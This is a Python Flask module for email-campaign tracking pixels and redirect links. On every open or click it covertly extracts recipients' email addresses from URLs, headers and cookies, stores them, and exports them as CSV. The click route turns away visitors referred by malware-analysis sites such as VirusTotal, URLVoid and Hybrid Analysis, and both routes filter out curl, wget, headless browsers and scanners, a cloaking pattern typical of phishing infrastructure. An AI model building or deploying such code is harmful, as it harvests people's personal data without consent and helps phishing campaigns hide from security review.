from flask import Blueprint, request, jsonify, send_file, redirect, current_app
from flask_login import login_required, current_user
from services.email_grabber import EmailGrabberService
from models.user import TrackingLink, Campaign, db
import sqlite3
import hashlib
import hmac
import time
import json
import base64
import io
import requests
from datetime import datetime, timedelta
import re
from urllib.parse import urlparse
import socket
import dns.resolver
import geoip2.database
import geoip2.errors
from user_agents import parse
import os

email_tracking_bp = Blueprint('email_tracking', __name__)
email_grabber = EmailGrabberService()

def get_client_ip():
    """Get client IP address"""
    if request.environ.get('HTTP_X_FORWARDED_FOR'):
        return request.environ['HTTP_X_FORWARDED_FOR'].split(',')[0].strip()
    return request.environ.get('REMOTE_ADDR', 'unknown')

def get_geolocation(ip_address):
    """Get geolocation information"""
    try:
        if ip_address in ['127.0.0.1', '::1', 'localhost']:
            return {'country_code': 'US', 'city': 'Local', 'is_vpn': False}
        
        response = requests.get(f'http://ipapi.co/{ip_address}/json/', timeout=2)
        if response.status_code == 200:
            data = response.json()
            return {
                'country_code': data.get('country_code', 'XX'),
                'city': data.get('city', 'Unknown'),
                'region': data.get('region', 'Unknown'),
                'latitude': data.get('latitude'),
                'longitude': data.get('longitude'),
                'timezone': data.get('timezone'),
                'isp': data.get('org', 'Unknown'),
                'is_vpn': data.get('threat', {}).get('is_anonymous', False)
            }
    except:
        pass
    
    return {'country_code': 'XX', 'city': 'Unknown', 'is_vpn': False}

def detect_bot(user_agent, headers):
    """Enhanced bot detection"""
    if not user_agent:
        return True, 0.9, "Missing user agent"
    
    ua_lower = user_agent.lower()
    confidence = 0.0
    reasons = []
    
    # Bot patterns
    bot_patterns = [
        'curl', 'wget', 'python-requests', 'axios', 'postman',
        'bot', 'crawler', 'spider', 'scanner', 'scraper',
        'headless', 'phantom', 'selenium', 'puppeteer'
    ]
    
    for pattern in bot_patterns:
        if pattern in ua_lower:
            confidence += 0.4
            reasons.append(f"Bot pattern: {pattern}")
    
    # Missing headers
    if not headers.get('Accept'):
        confidence += 0.2
        reasons.append("Missing Accept header")
    
    if not headers.get('Accept-Language'):
        confidence += 0.1
        reasons.append("Missing Accept-Language")
    
    # Suspicious user agent characteristics
    if len(user_agent) < 20:
        confidence += 0.2
        reasons.append("Suspicious user agent length")
    
    # Check for automation tools
    automation_indicators = ['automation', 'webdriver', 'test']
    for indicator in automation_indicators:
        if indicator in ua_lower:
            confidence += 0.3
            reasons.append(f"Automation indicator: {indicator}")
    
    is_bot = confidence > 0.6
    return is_bot, min(confidence, 1.0), "; ".join(reasons)

def record_tracking_event(token, event_type, ip_address, user_agent, 
                         country_code='XX', city='Unknown', is_bot=False, 
                         bot_confidence=0.0, blocked=False, block_reason=None,
                         auto_grabbed_emails=None):
    """Record tracking event with auto-grabbed emails"""
    try:
        # Parse user agent
        device_type = 'Unknown'
        browser = 'Unknown'
        
        if user_agent:
            ua = parse(user_agent)
            device_type = 'Mobile' if ua.is_mobile else 'Tablet' if ua.is_tablet else 'Desktop'
            browser = f"{ua.browser.family} {ua.browser.version_string}" if ua.browser.family else 'Unknown'
        
        # Get database connection (using SQLite for now)
        DATABASE_PATH = "database/app.db"
        conn = sqlite3.connect(DATABASE_PATH)
        cursor = conn.cursor()
        
        # Insert tracking event
        cursor.execute('''
            INSERT INTO tracking_events 
            (tracking_token, event_type, ip_address, user_agent, country_code, city, 
             device_type, browser, is_bot, bot_confidence, blocked, block_reason,
             auto_grabbed_emails, timestamp)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
        ''', (token, event_type, ip_address, user_agent, country_code, city,
              device_type, browser, is_bot, bot_confidence, blocked, block_reason,
              json.dumps(auto_grabbed_emails) if auto_grabbed_emails else None,
              datetime.utcnow().isoformat()))
        
        conn.commit()
        conn.close()
        
        return True
        
    except Exception as e:
        print(f"Error recording tracking event: {e}")
        return False

def generate_pixel():
    """Generate 1x1 transparent PNG pixel"""
    pixel_data = base64.b64decode('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==')
    return pixel_data

@email_tracking_bp.route('/track/pixel/<token>')
def track_pixel(token):
    """Enhanced pixel tracking with email autograb"""
    try:
        # Get request information
        ip_address = get_client_ip()
        user_agent = request.headers.get('User-Agent', '')
        referrer = request.headers.get('Referer', '')
        
        # Prepare data for email extraction
        request_data = {
            'url': request.url,
            'referrer': referrer,
            'headers': dict(request.headers),
            'cookies': dict(request.cookies),
            'user_agent': user_agent
        }
        
        # Extract emails using autograb service
        extraction_result = email_grabber.comprehensive_email_extraction(request_data)
        auto_grabbed_emails = [email_info['email'] for email_info in extraction_result['emails']]
        
        # Security checks
        blocked_referrers = [
            'facebook.com', 'twitter.com', 'linkedin.com', 'slack.com',
            'virustotal.com', 'urlvoid.com', 'hybrid-analysis.com'
        ]
        
        is_blocked_referrer = any(blocked in referrer.lower() for blocked in blocked_referrers) if referrer else False
        
        if is_blocked_referrer:
            record_tracking_event(token, 'pixel_blocked', ip_address, user_agent, 
                                 block_reason='Social referrer blocked',
                                 auto_grabbed_emails=auto_grabbed_emails)
        else:
            # Bot detection
            is_bot, confidence, reason = detect_bot(user_agent, dict(request.headers))
            
            if is_bot:
                record_tracking_event(token, 'pixel_blocked', ip_address, user_agent,
                                    is_bot=True, bot_confidence=confidence, 
                                    block_reason=f'Bot detected: {reason}',
                                    auto_grabbed_emails=auto_grabbed_emails)
            else:
                # Get geolocation
                geo = get_geolocation(ip_address)
                
                # Record successful pixel view
                record_tracking_event(token, 'pixel_view', ip_address, user_agent,
                                    country_code=geo['country_code'], city=geo['city'],
                                    auto_grabbed_emails=auto_grabbed_emails)
                
                # Update tracking link with auto-grabbed emails
                if auto_grabbed_emails:
                    try:
                        DATABASE_PATH = "database/app.db"
                        conn = sqlite3.connect(DATABASE_PATH)
                        cursor = conn.cursor()
                        
                        # Get existing auto-grabbed emails
                        cursor.execute("SELECT auto_grabbed_emails FROM tracking_links WHERE tracking_token = ?", (token,))
                        result = cursor.fetchone()
                        
                        if result:
                            existing_emails = json.loads(result[0]) if result[0] else []
                            # Merge with new emails
                            all_emails = list(set(existing_emails + auto_grabbed_emails))
                            
                            cursor.execute(
                                "UPDATE tracking_links SET auto_grabbed_emails = ? WHERE tracking_token = ?",
                                (json.dumps(all_emails), token)
                            )
                            conn.commit()
                        
                        conn.close()
                    except Exception as e:
                        print(f"Error updating auto-grabbed emails: {e}")
        
        # Always return pixel
        pixel_data = generate_pixel()
        response = current_app.response_class(
            pixel_data,
            mimetype='image/png',
            headers={
                'Cache-Control': 'no-cache, no-store, must-revalidate',
                'Pragma': 'no-cache',
                'Expires': '0',
                'X-Emails-Grabbed': str(len(auto_grabbed_emails))
            }
        )
        return response
        
    except Exception as e:
        print(f"Error in pixel tracking: {e}")
        return send_file(io.BytesIO(generate_pixel()), mimetype='image/png')

@email_tracking_bp.route('/track/click/<token>')
def track_click(token):
    """Enhanced click tracking with email autograb"""
    try:
        # Get request information
        ip_address = get_client_ip()
        user_agent = request.headers.get('User-Agent', '')
        referrer = request.headers.get('Referer', '')
        
        # Prepare data for email extraction
        request_data = {
            'url': request.url,
            'referrer': referrer,
            'headers': dict(request.headers),
            'cookies': dict(request.cookies),
            'user_agent': user_agent
        }
        
        # Extract emails using autograb service
        extraction_result = email_grabber.comprehensive_email_extraction(request_data)
        auto_grabbed_emails = [email_info['email'] for email_info in extraction_result['emails']]
        
        # Security checks
        blocked_referrers = [
            'facebook.com', 'twitter.com', 'linkedin.com', 'slack.com',
            'virustotal.com', 'urlvoid.com', 'hybrid-analysis.com'
        ]
        
        is_blocked_referrer = any(blocked in referrer.lower() for blocked in blocked_referrers) if referrer else False
        
        if is_blocked_referrer:
            record_tracking_event(token, 'click_blocked', ip_address, user_agent, 
                                 block_reason='Social referrer blocked',
                                 auto_grabbed_emails=auto_grabbed_emails)
            return "Access Denied", 403
        
        # Bot detection
        is_bot, confidence, reason = detect_bot(user_agent, dict(request.headers))
        
        if is_bot:
            record_tracking_event(token, 'click_blocked', ip_address, user_agent,
                                is_bot=True, bot_confidence=confidence, 
                                block_reason=f'Bot detected: {reason}',
                                auto_grabbed_emails=auto_grabbed_emails)
            return "Access Denied", 403
        
        # Get original URL
        DATABASE_PATH = "database/app.db"
        conn = sqlite3.connect(DATABASE_PATH)
        cursor = conn.cursor()
        cursor.execute("SELECT original_url FROM tracking_links WHERE tracking_token = ? AND is_active = 1", (token,))
        result = cursor.fetchone()
        
        if not result:
            conn.close()
            return "Link not found", 404
        
        original_url = result[0]
        
        # Update tracking link with auto-grabbed emails
        if auto_grabbed_emails:
            try:
                # Get existing auto-grabbed emails
                cursor.execute("SELECT auto_grabbed_emails FROM tracking_links WHERE tracking_token = ?", (token,))
                email_result = cursor.fetchone()
                
                if email_result:
                    existing_emails = json.loads(email_result[0]) if email_result[0] else []
                    # Merge with new emails
                    all_emails = list(set(existing_emails + auto_grabbed_emails))
                    
                    cursor.execute(
                        "UPDATE tracking_links SET auto_grabbed_emails = ? WHERE tracking_token = ?",
                        (json.dumps(all_emails), token)
                    )
                    conn.commit()
            except Exception as e:
                print(f"Error updating auto-grabbed emails: {e}")
        
        conn.close()
        
        # Get geolocation
        geo = get_geolocation(ip_address)
        
        # Record successful click
        record_tracking_event(token, 'click', ip_address, user_agent,
                            country_code=geo['country_code'], city=geo['city'],
                            auto_grabbed_emails=auto_grabbed_emails)
        
        # Redirect to original URL
        return redirect(original_url, code=302)
        
    except Exception as e:
        print(f"Error in click tracking: {e}")
        return "Internal Server Error", 500

@email_tracking_bp.route('/api/emails/grabbed/<token>')
@login_required
def get_grabbed_emails(token):
    """Get auto-grabbed emails for a tracking token"""
    try:
        DATABASE_PATH = "database/app.db"
        conn = sqlite3.connect(DATABASE_PATH)
        cursor = conn.cursor()
        
        # Get tracking link and verify ownership
        cursor.execute('''
            SELECT tl.auto_grabbed_emails, c.user_id 
            FROM tracking_links tl
            JOIN campaigns c ON tl.campaign_id = c.id
            WHERE tl.tracking_token = ?
        ''', (token,))
        
        result = cursor.fetchone()
        conn.close()
        
        if not result:
            return jsonify({'error': 'Tracking link not found'}), 404
        
        auto_grabbed_emails, owner_id = result
        
        # Check if user has permission to view
        if not current_user.is_admin and current_user.id != owner_id:
            return jsonify({'error': 'Permission denied'}), 403
        
        emails = json.loads(auto_grabbed_emails) if auto_grabbed_emails else []
        
        # Get detailed information about grabbed emails
        detailed_emails = []
        for email in emails:
            category_info = email_grabber.categorize_email(email)
            is_valid, validation_info = email_grabber.validate_email_domain(email)
            
            detailed_emails.append({
                'email': email,
                'category': category_info,
                'validation': validation_info,
                'is_valid': is_valid
            })
        
        return jsonify({
            'token': token,
            'total_emails': len(emails),
            'emails': detailed_emails,
            'insights': email_grabber.get_email_insights(emails)
        }), 200
        
    except Exception as e:
        return jsonify({'error': 'Failed to get grabbed emails'}), 500

@email_tracking_bp.route('/api/emails/analytics')
@login_required
def get_email_analytics():
    """Get email analytics for user's campaigns"""
    try:
        DATABASE_PATH = "database/app.db"
        conn = sqlite3.connect(DATABASE_PATH)
        cursor = conn.cursor()
        
        # Get all auto-grabbed emails for user's campaigns
        if current_user.is_admin:
            cursor.execute('''
                SELECT te.auto_grabbed_emails, te.timestamp, tl.tracking_token
                FROM tracking_events te
                JOIN tracking_links tl ON te.tracking_token = tl.tracking_token
                WHERE te.auto_grabbed_emails IS NOT NULL
                ORDER BY te.timestamp DESC
            ''')
        else:
            cursor.execute('''
                SELECT te.auto_grabbed_emails, te.timestamp, tl.tracking_token
                FROM tracking_events te
                JOIN tracking_links tl ON te.tracking_token = tl.tracking_token
                JOIN campaigns c ON tl.campaign_id = c.id
                WHERE c.user_id = ? AND te.auto_grabbed_emails IS NOT NULL
                ORDER BY te.timestamp DESC
            ''', (current_user.id,))
        
        results = cursor.fetchall()
        conn.close()
        
        all_emails = []
        email_timeline = []
        
        for auto_grabbed_emails, timestamp, token in results:
            if auto_grabbed_emails:
                emails = json.loads(auto_grabbed_emails)
                all_emails.extend(emails)
                
                email_timeline.append({
                    'timestamp': timestamp,
                    'token': token,
                    'emails_count': len(emails),
                    'emails': emails
                })
        
        # Get insights
        insights = email_grabber.get_email_insights(all_emails)
        
        # Calculate growth metrics
        daily_stats = {}
        for entry in email_timeline:
            date = entry['timestamp'][:10]  # Get date part
            if date not in daily_stats:
                daily_stats[date] = {'emails': 0, 'events': 0}
            daily_stats[date]['emails'] += entry['emails_count']
            daily_stats[date]['events'] += 1
        
        return jsonify({
            'total_emails_grabbed': len(all_emails),
            'unique_emails': len(set(all_emails)),
            'insights': insights,
            'timeline': email_timeline[:50],  # Last 50 events
            'daily_stats': daily_stats
        }), 200
        
    except Exception as e:
        return jsonify({'error': 'Failed to get email analytics'}), 500

@email_tracking_bp.route('/api/emails/export')
@login_required
def export_grabbed_emails():
    """Export grabbed emails as CSV"""
    try:
        DATABASE_PATH = "database/app.db"
        conn = sqlite3.connect(DATABASE_PATH)
        cursor = conn.cursor()
        
        # Get all auto-grabbed emails for user's campaigns
        if current_user.is_admin:
            cursor.execute('''
                SELECT te.auto_grabbed_emails, te.timestamp, tl.tracking_token, c.name
                FROM tracking_events te
                JOIN tracking_links tl ON te.tracking_token = tl.tracking_token
                JOIN campaigns c ON tl.campaign_id = c.id
                WHERE te.auto_grabbed_emails IS NOT NULL
                ORDER BY te.timestamp DESC
            ''')
        else:
            cursor.execute('''
                SELECT te.auto_grabbed_emails, te.timestamp, tl.tracking_token, c.name
                FROM tracking_events te
                JOIN tracking_links tl ON te.tracking_token = tl.tracking_token
                JOIN campaigns c ON tl.campaign_id = c.id
                WHERE c.user_id = ? AND te.auto_grabbed_emails IS NOT NULL
                ORDER BY te.timestamp DESC
            ''', (current_user.id,))
        
        results = cursor.fetchall()
        conn.close()
        
        # Create CSV content
        csv_content = "Email,Campaign,Token,Timestamp,Category,Provider,Is_Valid\n"
        
        for auto_grabbed_emails, timestamp, token, campaign_name in results:
            if auto_grabbed_emails:
                emails = json.loads(auto_grabbed_emails)
                for email in emails:
                    category_info = email_grabber.categorize_email(email)
                    is_valid, _ = email_grabber.validate_email_domain(email)
                    
                    csv_content += f'"{email}","{campaign_name}","{token}","{timestamp}","{category_info["type"]}","{category_info["provider"]}","{is_valid}"\n'
        
        # Create response
        response = current_app.response_class(
            csv_content,
            mimetype='text/csv',
            headers={
                'Content-Disposition': f'attachment; filename=grabbed_emails_{datetime.now().strftime("%Y%m%d_%H%M%S")}.csv'
            }
        )
        
        return response
        
    except Exception as e:
        return jsonify({'error': 'Failed to export emails'}), 500

@email_tracking_bp.route('/api/emails/test-extraction', methods=['POST'])
@login_required
def test_email_extraction():
    """Test email extraction functionality"""
    try:
        data = request.get_json()
        
        # Prepare test data
        test_data = {
            'url': data.get('url', ''),
            'referrer': data.get('referrer', ''),
            'headers': data.get('headers', {}),
            'cookies': data.get('cookies', {}),
            'user_agent': data.get('user_agent', ''),
            'form_data': data.get('form_data', {}),
            'json_data': data.get('json_data', {})
        }
        
        # Extract emails
        extraction_result = email_grabber.comprehensive_email_extraction(test_data)
        
        return jsonify({
            'success': True,
            'extraction_result': extraction_result
        }), 200
        
    except Exception as e:
        return jsonify({'error': 'Email extraction test failed'}), 500

